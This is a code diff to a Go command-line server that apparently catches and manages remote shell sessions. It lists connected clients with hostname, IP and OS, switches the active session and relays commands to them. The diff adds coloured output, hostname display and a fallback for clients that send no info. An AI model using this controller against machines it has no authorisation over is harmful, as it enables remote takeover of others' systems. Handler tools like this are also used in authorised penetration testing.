@@ -19,14 +19,16 @@ var wg sync.WaitGroup
 var globalMap globalMaster
 var stdin chan string
 var HOST_IP string
+var colors Colors
 
 func main() {
+	colors = initColors()
 	handleArgs()
 	go readStdin()
 	go handleQuit()
 	// return
 	// TODO: add handler for multiple ports
-	fmt.Println("Server starting...")
+	infoln("Server starting...")
 	caret()
 	for {
 		connectionHelper()
@@ -71,8 +73,17 @@ func GetConnection(port string) {
 		conn, _ := getPort.Accept()
 		var clientInfo ClientInfo
 		remoteInfo, err := bufio.NewReader(conn).ReadString('\n')
-		if strings.Index(remoteInfo, "INFO:") != -1 {
+		if strings.Contains(remoteInfo, "INFO:") {
 			clientInfo = parseParams(remoteInfo)
+		} else {
+			clientInfo = ClientInfo{
+				lanIP:      "Unknown",
+				clientType: "Unknown",
+				os:         "Unknown",
+				osFlavor:   "Unknown",
+				hostname:   "Unknown",
+				isEncoded:  false,
+			}
 		}
 		if err != nil {
 			fmt.Println(err.Error())
@@ -101,7 +112,7 @@ func enterTerminal(channel *chan string, reader *bufio.Reader) {
 			caret()
 			return
 		} else if globalMap.IsDead(activeClient) {
-			fmt.Println("Error: client session no longer exists. Exiting...")
+			errorln("Error: client session no longer exists. Exiting...")
 			fmt.Println("---Leaving terminal---")
 			caret()
 			return
@@ -120,14 +131,21 @@ func readStdin() {
 		args := strings.Split(cmd, " ")
 		switch args[0] {
 		case "exit":
-			fmt.Println("Goodbye!")
+			infoln("Goodbye!")
 			os.Exit(0)
 		case "send":
 			if IsActiveClient() {
-				globalMap.SetSingle(true)
-				*channel <- cmd[5:]
+				activeClient := globalMap.GetActiveChannel()
+				client := globalMap.GetClient(activeClient)
+				if client.isEncoded {
+					globalMap.SetSingle(true)
+					*channel <- cmd[5:]
+				} else {
+					errorln("Error: Can only use send with encoded clients")
+					caret()
+				}
 			} else {
-				fmt.Println("Error: no active client")
+				errorln("Error: no active client")
 				caret()
 			}
 		case "enter":
@@ -136,7 +154,7 @@ func readStdin() {
 				fmt.Println("---Entering terminal---")
 				enterTerminal(channel, reader)
 			} else {
-				fmt.Println("Error: no active client")
+				errorln("Error: no active client")
 				caret()
 				break
 			}
@@ -144,12 +162,12 @@ func readStdin() {
 			switch args[1] {
 			case "active":
 				if len(args) < 3 {
-					fmt.Println("Error: must supply an ID")
+					errorln("Error: must supply an ID")
 					break
 				}
 				id, err := strconv.Atoi(args[2])
 				if err != nil {
-					fmt.Println("Error: Please provide a valid client ID")
+					errorln("Error: Please provide a valid client ID")
 					break
 				}
 				if globalMap.GetActiveChannel() == id {
@@ -181,7 +199,7 @@ func readStdin() {
 					var err error
 					clientId, err = strconv.Atoi(args[2])
 					if err != nil {
-						fmt.Println("Error: Please provide a valid client ID")
+						errorln("Error: Please provide a valid client ID")
 						break
 					}
 				}
@@ -189,9 +207,9 @@ func readStdin() {
 				// fmt.Println(clientId)
 				if globalMap.GetCurrentId() <= clientId || clientId < 0 {
 					if len(args) < 3 {
-						fmt.Println("Error: no active client")
+						errorln("Error: no active client")
 					} else {
-						fmt.Println("Error: client does not exist")
+						errorln("Error: client does not exist")
 					}
 				} else {
 					clientDead := ""
@@ -201,13 +219,15 @@ func readStdin() {
 					fmt.Printf("Info for client %d%s:\n", clientId, clientDead)
 					curClient := globalMap.GetClient(clientId)
 					fmt.Printf(
-						"LAN IP: %s\n"+
+						"Hostname: %s\n"+
+							"LAN IP: %s\n"+
 							"WAN IP: %s\n"+
 							"Port: %s\n"+
 							"Using client: %s\n"+
 							"OS: %s\n"+
 							"OS Type: %s\n"+
 							"Encoded connection: %t\n",
+						curClient.hostname,
 						curClient.lanIP,
 						curClient.wanIP,
 						curClient.port,
@@ -221,7 +241,7 @@ func readStdin() {
 				fmt.Println("Current clients: ")
 				for _, client := range globalMap.GetClients() {
 					if !client.isDead {
-						fmt.Printf("Client %d\n", client.id)
+						fmt.Printf("Client %d | %s (%s)\n", client.id, client.lanIP, client.hostname)
 					}
 				}
 			case "active":
@@ -237,14 +257,14 @@ func readStdin() {
 			if len(args) >= 2 {
 				clientId, err := strconv.Atoi(args[1])
 				if err != nil {
-					fmt.Println("Error: Please provide a valid client ID")
+					errorln("Error: Please provide a valid client ID")
 					break
 				}
 				if globalMap.GetCurrentId() <= clientId || clientId < 0 {
 					if len(args) < 3 {
-						fmt.Println("Error: no active client")
+						errorln("Error: no active client")
 					} else {
-						fmt.Println("Error: client does not exist")
+						errorln("Error: client does not exist")
 					}
 				} else {
 					client := globalMap.GetClient(clientId)
@@ -267,7 +287,7 @@ func readStdin() {
 		// case "\C":
 
 		default:
-			fmt.Println("Error: unknown command")
+			errorln("Error: unknown command")
 			caret()
 		}
 
